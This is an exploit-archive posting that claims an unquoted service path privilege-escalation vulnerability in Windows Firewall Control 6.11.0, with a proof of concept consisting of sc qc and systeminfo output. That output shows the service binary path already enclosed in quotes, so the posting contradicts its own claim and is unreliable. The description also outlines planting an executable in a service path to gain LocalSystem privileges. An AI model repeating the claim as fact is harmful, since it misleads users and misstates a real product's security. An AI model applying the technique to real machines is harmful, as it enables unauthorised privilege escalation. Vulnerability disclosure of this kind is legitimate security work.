id: 39713
date: 08/08/2024
title: Windows Firewall Control 6.11.0 Unquoted Service Path Vulnerability
author: Milad karimi
cves: 

# Exploit Title: Microsoft Windows Firewall Control 6.11.0 - Unquoted
Service Path
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Contact: miladgrayhat@gmail.com
# Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
# MiRROR-H: https://mirror-h.org/search/hacker/49626/
# Vendor Homepage: http://www.binisoft.org
# Software Link: http://www.binisoft.org
# Version: 6.11.0
# Tested on: Windows 10 Pro x64

1. Description:

Windows Firewall Control lacks of the quotes in filepath, causing it to be
a potential vector of privilege escalation attack.
To properly exploit this vulnerability, the local attacker must insert an
executable file in the path of the service. Upon service restart or system
reboot, the malicious code will be run with elevated privileges.



2. POC

C:\>sc qc "wfcs"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: wfcs
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Windows Firewall
Control\wfcs.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Windows Firewall Control
        DEPENDENCIES       : MpsSvc
        SERVICE_START_NAME : LocalSystem


C:\>systeminfo

OS Name:  Microsoft Windows 10 Pro
OS Version: 10.0.19045 N/A Build 19045
OS Manufacturer: Microsoft Corporation

#  0day.today [2024-08-12]  #